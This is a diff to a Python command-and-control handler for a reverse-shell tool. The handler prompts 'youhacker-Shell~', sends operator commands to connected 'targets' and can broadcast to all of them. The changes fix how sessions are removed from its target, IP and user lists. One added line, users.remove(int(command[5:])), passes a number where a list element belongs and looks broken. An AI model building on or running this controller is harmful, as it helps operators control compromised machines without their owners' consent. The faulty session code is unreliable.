@@ -167,6 +167,9 @@ def target_communication(target, ip):
             command = input('youhacker-Shell~%s: ' % str(ip))
             reliable_send(target, command)
             if command == 'quit':
+                targets.remove(target)
+                ips.remove(ip)
+                users.remove(users[num])
                 break
 
             elif command == 'back':
@@ -237,7 +240,7 @@ def target_communication(target, ip):
     except:
         targets.remove(target)
         ips.remove(ip)
-        users.remove(user)
+        users.remove(users[num])
         print("[-] session lost")
 
 
@@ -260,6 +263,7 @@ def accept_connections():
                 print((str(ip) + ' has connected!'))
                 clients += 1
             else:
+
                 pass
 
 
@@ -294,6 +298,7 @@ while True:
         os.system('cls')
     elif command[:7] == 'connect':
         try:
+            global num
             num = int(command[8:])
             tarnum = targets[num]
             tarip = ips[num]
@@ -324,6 +329,7 @@ while True:
             ip = ips[int(command[7:])]
             targets.remove(targ)
             ips.remove(ip)
+            users.remove(users[int(command[7:])])
         except:
             print('This session not Available')
 
@@ -344,6 +350,7 @@ while True:
         targ.close()
         targets.remove(targ)
         ips.remove(ip)
+        users.remove(int(command[5:]))
 
     elif command[:7] == 'sendall':
         x = len(targets)
